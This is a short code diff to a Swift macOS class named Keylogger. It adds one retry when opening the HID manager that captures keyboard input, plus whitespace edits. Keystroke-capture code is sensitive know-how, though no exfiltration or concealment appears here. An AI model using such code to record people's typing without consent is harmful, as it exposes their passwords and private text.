@@ -70,12 +70,14 @@ class Keylogger
         IOHIDManagerRegisterInputValueCallback(manager, CallBackFunctions.Handle_IOHIDInputValueCallback, observer);
         
         /* Open HID Manager */
-        let ioreturn: IOReturn = openHIDManager()
+        var ioreturn: IOReturn = openHIDManager()
         if ioreturn != kIOReturnSuccess
         {
-            print("Can't open HID!")
+            ioreturn = openHIDManager()
+            if ioreturn != kIOReturnSuccess {
+                print("Can't open HID!")
+            }
         }
-
     }
     
     @objc dynamic func activatedApp(notification: NSNotification)
@@ -137,6 +139,7 @@ class Keylogger
     func start()
     {
 //        print("start")
+        
         IOHIDManagerScheduleWithRunLoop(manager, CFRunLoopGetMain(), CFRunLoopMode.defaultMode.rawValue)
     }
     
